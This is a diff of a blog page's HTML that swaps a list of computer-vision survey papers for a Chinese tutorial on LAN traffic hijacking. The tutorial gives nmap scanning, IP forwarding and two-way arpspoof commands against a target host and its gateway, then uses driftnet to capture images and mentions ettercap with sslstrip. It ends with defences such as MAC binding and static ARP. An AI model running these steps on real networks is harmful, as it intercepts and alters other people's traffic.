@@ -22,7 +22,7 @@
 
 
 
-  <meta name="keywords" content="计算机视觉,转载," />
+  <meta name="keywords" content="无线安全,网络工程," />
 
 
 
@@ -55,7 +55,7 @@
 
 
 
-  <title> 计算机视觉-机器学习领域 近两年部分综述文章 // Neurohazard </title>
+  <title> 内网渗透初步：基于ARP欺骗的流量劫持 // Neurohazard </title>
 </head>
 
 <body>
@@ -158,7 +158,7 @@
           
           
             
-              计算机视觉-机器学习领域 近两年部分综述文章
+              内网渗透初步：基于ARP欺骗的流量劫持
             
           
         </h1>
@@ -166,14 +166,14 @@
 
       <div class="post-meta">
         <span class="post-time">
-          發表於 2015-08-13
+          發表於 2015-09-06
         </span>
 
         
           <span class="post-category">
             &nbsp; | &nbsp; 分類於
             
-              <a href="/categories/机器学习/">机器学习</a>
+              <a href="/categories/信息安全/">信息安全</a>
 
               
               
@@ -186,8 +186,8 @@
           
             <span class="post-comments-count">
             &nbsp; | &nbsp;
-            <a href="/2015/08/13/cv-papers-2/#comments" >
-              <span class="post-comments-count ds-thread-count" data-thread-key="2015/08/13/cv-papers-2/"></span>
+            <a href="/2015/09/06/arp-spoofing-and-MITM/#comments" >
+              <span class="post-comments-count ds-thread-count" data-thread-key="2015/09/06/arp-spoofing-and-MITM/"></span>
             </a>
           </span>
           
@@ -201,20 +201,36 @@
       
 
       
-        <h1 id="2015">2015</h1><p>[1].    E.Sariyanidi, H. Gunes, A. Cavallaro, Automatic Analysisof Facial Affect: A Survey of Registration, Representation, and Recognition,IEEE TRANSACTIONS ON PATTERN ANALYSIS AND MACHINE INTELLIGENCE, VOL. 37, NO. 6,JUNE 2015</p>
-<p>[2].    T. Li,H. Chang, M. Wang, B.B. Ni, R.C. Hong, S.C. Yan, CrowdedScene Analysis: A Survey, IEEE TRANSACTIONS ON CIRCUITS AND SYSTEMS FORVIDEO TECHNOLOGY, VOL. 25, NO. 3, MARCH 2015</p>
-<p>[3].    Z.Zhang, Y. Xu, J. Yang, X.L. Li, D. Zhang, A Survey ofSparse Representation: Algorithms and Applications, IEEE ACCESS, date ofpublication May 6, 2015</p>
-<p>[4].    J.Galbally, S. Marcel, J. Fierrez, Biometric AntispoofingMethods: A Survey in Face Recognition, IEEE ACCESS, date of publicationDecember 18, 2014</p>
-<p>[5].    B.Tian, B. T. Morris, M. Tang, Y.Q. Liu, Y. J. Yao, C. Guo, D.Y. Shen, S.H. Tang, Hierarchical and Networked Vehicle Surveillance in ITS:A Survey, IEEE TRANSACTIONS ON INTELLIGENT TRANSPORTATION SYSTEMS, VOL.16, NO. 2, APRIL 2015</p>
-<p>[6].    A. Betancourt,P. Morerio, C. S. Regazzoni, and M. Rauterberg, TheEvolution of First Person Vision Methods: A Survey, IEEE TRANSACTIONS ONCIRCUITS AND SYSTEMS FOR VIDEO TECHNOLOGY, VOL. 25, NO. 5, MAY 2015</p>
-<p>[7].    L.Shao, F. Zhu, and X.L. Li, Transfer Learning for VisualCategorization: A Survey, IEEE TRANSACTIONS ON NEURAL NETWORKS ANDLEARNING SYSTEMS, VOL. 26, NO. 5, MAY 2015</p>
-<h1 id="2014">2014</h1><p>[8].    S. Fu,H. B. He, Z.G. Hou, Learning Race from Face: A Survey, IEEE TRANSACTIONS ON PATTERN ANALYSIS AND MACHINE INTELLIGENCE, VOL. 36, NO.12, DECEMBER 2014</p>
-<p>[9].    H.L. Zhou,A. Mian, L. Wei, D. Creighton, M. Hossny, and S. Nahavandi, Recent Advances on Singlemodal and Multimodal FaceRecognition: A Survey, IEEE TRANSACTIONS ON HUMAN-MACHINE SYSTEMS, VOL.44, NO. 6, DECEMBER 2014</p>
-<h1 id="2013">2013</h1><p>[10].  O. D. Lara, M.A. Labrador, A Survey on Human Activity Recognition using WearableSensors, IEEE COMMUNICATIONS SURVEYS &amp; TUTORIALS, VOL. 15, NO. 3,THIRD QUARTER 2013</p>
-<p>[11].  A. Sotiras, C. Davatzikos, Nikos. Paragios, Deformable Medical Image Registration: A Survey, IEEETRANSACTIONS ON MEDICAL IMAGING, VOL. 32, NO. 7, JULY 2013</p>
-<p>[12].  A. Alrahayfeh, M. Faezipour, Eye Tracking and Head Movement Detection: A State-of-ArtSurvey, IEEE Journal of Translational Engineering in Health andMedicine, 2013</p>
-<p>[13].  P.V.K. Borges, N. Conci, and A. Cavallaro, Video-Based Human Behavior Understanding: A Survey, IEEETRANSACTIONS ON CIRCUITS AND SYSTEMS FOR VIDEO TECHNOLOGY, VOL. 23, NO. 11,NOVEMBER 2013</p>
-<h1 id="参考资料">参考资料</h1><p>[1] <a href="http://www.valseonline.org/thread-505-1-1.html" target="_blank" rel="external">VALSE论坛讨论</a></p>
+        <h1 id="工具安装">工具安装</h1><p>Nmap（网络探测工具和安全/端口扫描器）<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="built_in">get</span> install <span class="keyword">nmap</span></span><br></pre></td></tr></table></figure></p>
+<p>Arpspoof(ARP欺骗）<br>ARP欺骗工具，工作原理就是不断的向目标发送ARP数据包，包内容为“我是XXX，请把发给XXX的数据包发给我”。<br><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="keyword">get</span> install dsniff</span><br></pre></td></tr></table></figure></p>
+<p>Ettercap(数据包嗅探和篡改)<br>Ettercap，“中间人”攻击利器，ARP欺骗、DNS欺骗、数据包替换等等，十分强大，不可细说，详细使用方式参考手册（man ettercap)。</p>
+<p>Driftnet<br>抓取经过本机的网络数据包中的图片并显示，同时支持抓取和显示音频文件（来源man手册）<br><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="keyword">get</span> install driftnet</span><br></pre></td></tr></table></figure></p>
+<h1 id="环境模拟">环境模拟</h1><p>实验环境<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Distributor <span class="string">ID:</span>	Ubuntu</span><br><span class="line"><span class="string">Description:</span>	Ubuntu <span class="number">14.04</span>.3 LTS</span><br><span class="line"><span class="string">Release:</span>	<span class="number">14.04</span></span><br><span class="line"><span class="string">Codename:</span>	trusty</span><br></pre></td></tr></table></figure></p>
+<h2 id="信息收集">信息收集</h2><h3 id="网段主机查询">网段主机查询</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">nmap</span> -sP  <span class="number">192.168.1.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>
+<p>详细使用方法参考<a href="https://nmap.org/man/zh/" target="_blank" rel="external">NmapManual</a></p>
+<h3 id="锁定目标">锁定目标</h3><p>该步不是必需。选定目标为主机A(这里假定IP地址为192.168.1.110)，使用命令”nmap 192.168.1.110”可获得主机A的详细情况，如服务端口开放情况，操作系统类型等信息。</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">nmap</span> <span class="tag">-A</span> 192<span class="class">.168</span><span class="class">.1</span><span class="class">.110</span></span><br></pre></td></tr></table></figure>
+<h2 id="开启IP转发和ARP欺骗">开启IP转发和ARP欺骗</h2><p>网关查询<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">ip</span> route show</span><br></pre></td></tr></table></figure></p>
+<p>该步仅针对交换式局域网，共享式局域网可以忽略（共享式网络只要打开网卡的混杂模式就可以抓取所有内网数据包），ARP欺骗一般目的是把自己伪装成网关，但如果不作处理，当被欺骗数据包到达后就会被本机丢弃（因为自己到底不是网关，还不知道如何处理这类数据包），这当然是不允许的。开启IP转发功能可以解决该问题，IP转发负责把该类数据包再转发给真正的网关处理，开启IP转发的方法(注意使用root操作第二条命令）<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">echo <span class="number">1</span> &gt; /<span class="keyword">proc</span>/sys/net/ipv4/ip_forward</span><br><span class="line">sudo arpspoof -i eth0 -t <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">110</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span></span><br><span class="line">sudo arpspoof -i eth0 -t <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">110</span></span><br></pre></td></tr></table></figure></p>
+<p>“-i eth0”指定设备节点，无线网络时可能是”-i wlan0”； - “-t 192.168.1.xxx”指定欺骗对象，如果不指定该项，则欺骗对象为整个网络（ARP病毒引起局域网瘫痪就是这么干的，操作前需注意)，最后一个参数”192.168.1.xxx”指伪装目标。</p>
+<p><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code><br>就是将IP转发的开关置为1<br>这里顺带可以用以下命令检查IP转发开关情况<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /<span class="keyword">proc</span>/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure></p>
+<h2 id="数据抓包">数据抓包</h2><p>该步不是必需。抓包分析只是为了辅助需要（通过分析数据包流量情况监控攻击工程，同时也是深入理解攻击原理的有效方法），使用wireshark工具抓取所有和主机A相关的数据包，过滤掉不相关数据包，只抓取主机A发出或者发给主机A的数据包。启动wireshark：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">sudo</span> wireshark</span><br></pre></td></tr></table></figure>
+<p>数据包的数量非常强大，写出优秀的过滤条件是成功渗透的关键：<br>以下仅提供最基础的过滤条件<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip<span class="class">.addr</span> == <span class="number">192.168</span>.<span class="number">1.110</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="图片抓包">图片抓包</h2><p>抓取主机A http流量中的图片，通过driftnet工具实现，运行下面命令<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo driftnet -<span class="tag">i</span> eth0</span><br></pre></td></tr></table></figure></p>
+<p>其他例如篡改主机A访问的页面，可以通过ettercap工具实现。ettercap是个强大的工具，再配合sslstrip降级SSL，基本可以为所欲为。 ettercap详细使用方法请参考man手册（man ettercap)，这里有一篇文章可以参考一二。</p>
+<h1 id="如何防范">如何防范</h1><p>安全形势如此严重，不得不防啊。但安全总是有成本和代价的，下面建议供参考。</p>
+<p>对于交换式局域网，重点守住两条： </p>
+<ol>
+<li>交换机端口绑定IP和MAC，完成该步，可以说基本天下太平，这个一般是网络管理员的职责； </li>
+<li>如果第1步无法实现，在自己的机器上把网关IP和MAC地址静态绑定。</li>
+</ol>
+<p>对于共享式局域网,这一般是在家里、街上或者出租房中合伙使用的无线路由器下的网络。也是重点守着两条： </p>
+<ol>
+<li>不要随便连接未知无线网络； </li>
+<li>管理好自己家里的无线路由器，最好使用WPA加密方式，并定期检察安全情况。</li>
+</ol>
+<h1 id="参考资料">参考资料</h1><p>[1] <a href="http://goodbai.com/secure/WhyLANSoInsecure.html" target="_blank" rel="external">局域网安全为何如此不堪：演习一次内网攻击</a><br>[2] <a href="https://www.91ri.org/4408.html" target="_blank" rel="external">Linux渗透之Ettercap详解</a><br>[3] <a href="http://www.2cto.com/article/201301/183322.html" target="_blank" rel="external">Ettercap简要原理介绍以及使用说明</a><br>[4] <a href="http://netsecurity.51cto.com/art/201212/371895.htm" target="_blank" rel="external">MITM原理简介</a><br>[5] <a href="http://blog.sina.com.cn/s/blog_4a898cfb0100t8j7.html" target="_blank" rel="external">通过伪造CA证书，实现SSL中间人攻击</a><br>[6] <a href="http://fex.baidu.com/blog/2014/04/traffic-hijack/" target="_blank" rel="external">流量劫持是如何产生的</a></p>
 
       
     </div>
@@ -223,9 +239,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/计算机视觉/"> #计算机视觉 </a>
+            <a href="/tags/无线安全/"> #无线安全 </a>
           
-            <a href="/tags/转载/"> #转载 </a>
+            <a href="/tags/网络工程/"> #网络工程 </a>
           
         </div>
       
@@ -234,13 +250,11 @@
         <div class="post-nav">
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2015/08/15/mdk3-tutorial/">Ubuntu 14.04 安装 mdk3 及 使用测试</a>
-            
           </div>
 
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2015/08/13/cvpr-2015/">CVPR 2015</a>
+              <a href="/2015/09/06/ubuntu-installation/">Ubuntu 安装中出现的错误总结</a>
             
           </div>
         </div>
@@ -283,8 +297,8 @@
     
       <div class="comments" id="comments">
         
-          <div class="ds-thread" data-thread-key="2015/08/13/cv-papers-2/"
-               data-title="计算机视觉-机器学习领域 近两年部分综述文章" data-url="http://blkstone.github.io/2015/08/13/cv-papers-2/">
+          <div class="ds-thread" data-thread-key="2015/09/06/arp-spoofing-and-MITM/"
+               data-title="内网渗透初步：基于ARP欺骗的流量劫持" data-url="http://blkstone.github.io/2015/09/06/arp-spoofing-and-MITM/">
           </div>
         
       </div>
@@ -397,7 +411,7 @@
           <div class="post-toc">
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#2015"><span class="nav-number">1.</span> <span class="nav-text">2015</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2014"><span class="nav-number">2.</span> <span class="nav-text">2014</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2013"><span class="nav-number">3.</span> <span class="nav-text">2013</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考资料"><span class="nav-number">4.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#工具安装"><span class="nav-number">1.</span> <span class="nav-text">工具安装</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#环境模拟"><span class="nav-number">2.</span> <span class="nav-text">环境模拟</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#信息收集"><span class="nav-number">2.1.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#网段主机查询"><span class="nav-number">2.1.1.</span> <span class="nav-text">网段主机查询</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#锁定目标"><span class="nav-number">2.1.2.</span> <span class="nav-text">锁定目标</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#开启IP转发和ARP欺骗"><span class="nav-number">2.2.</span> <span class="nav-text">开启IP转发和ARP欺骗</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#数据抓包"><span class="nav-number">2.3.</span> <span class="nav-text">数据抓包</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#图片抓包"><span class="nav-number">2.4.</span> <span class="nav-text">图片抓包</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#如何防范"><span class="nav-number">3.</span> <span class="nav-text">如何防范</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考资料"><span class="nav-number">4.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
             
           </div>
           <div class="post-toc-indicator-bottom post-toc-indicator"></div>
